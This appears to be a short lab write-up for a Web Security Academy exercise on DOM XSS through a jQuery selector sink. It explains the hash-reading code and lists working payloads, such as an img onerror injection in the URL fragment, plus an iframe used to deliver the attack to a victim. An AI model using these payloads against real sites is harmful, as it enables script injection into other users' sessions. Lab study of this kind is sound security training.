Title: DOM XSS in jQuery selector sink using a hashchange event

TIP: see $() -> try to use onload="<img src=x onerror=print()>">


So, the vulnerable code is like that:
![image](https://github.com/user-attachments/assets/f867ea10-e7cf-45d6-862a-da1eb292aa06)

It takes chars after '#' sign in the URL and try to find an <h2> element inside a section with the class blog-list whose 
text contains the decoded hash string

What is important - here this site use jQuery selector $(), and we can inject malicious HTML element with our XSS code into this selector.

The easiest way to exploit this logic is by using this payload:
`<img src=x onerror=print()>`
URL would look like that
`https://0a0b008f03d9b4fe809908d200ff001b.web-security-academy.net/#<img src=x onerror=print()>`

But also we can use more complicated payload:
`#onload="<img src=x onerror=print()>">`
`#" onload="this.src+='<img src=x onerror=print()>'">`

And we can use this vulerability sending email to the victim, using iframe as additional layer:
<iframe src="https://0a0b008f03d9b4fe809908d200ff001b.web-security-academy.net#" onload="this.src+='<img src=x onerror=print()>'"></iframe>





